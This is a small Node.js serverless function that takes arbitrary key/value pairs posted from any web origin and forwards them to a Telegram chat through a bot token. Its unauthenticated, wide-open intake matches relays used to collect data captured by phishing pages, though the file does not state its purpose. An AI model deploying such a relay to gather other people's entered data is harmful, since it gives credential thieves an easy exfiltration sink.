const axios = require('axios');

module.exports = async (req, res) => {
 
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader(
        'Access-Control-Allow-Headers',
        'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );

    // Handle the "preflight" request
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    const TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (req.method === 'POST') {
        const { key, value } = req.body;
        
        try {
            await axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: ` *KEY:* ${key}\n *DATA:* ${value}`,
                parse_mode: 'Markdown'
            });
            return res.status(200).json({ success: true });
        } catch (err) {
            return res.status(500).json({ error: 'Telegram API Error' });
        }
    }
    
    res.status(405).json({ error: 'Only POST allowed' });
};